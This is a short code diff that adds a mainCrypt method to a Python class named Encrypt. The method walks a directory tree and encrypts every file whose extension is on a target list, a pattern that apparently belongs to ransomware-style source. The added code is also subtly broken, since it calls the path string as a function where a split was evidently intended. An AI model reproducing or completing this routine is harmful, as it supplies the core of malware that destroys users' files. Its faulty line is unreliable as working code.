@@ -25,4 +25,13 @@ class Encrypt:
             f.write(self.key)
 
 
+    def mainCrypt(self, root_dir, encrypted = False):
+        for root, _, files in os.walk(root_dir):
+            for f in files:
+                abs_file_path = os.path.join(root, f)
+
+                if not abs_file_path('.')[-1] in self.file_ext_targets:
+                    continue
+
+                self.crypt_file(abs_file_path, encrypted = encrypted)
     
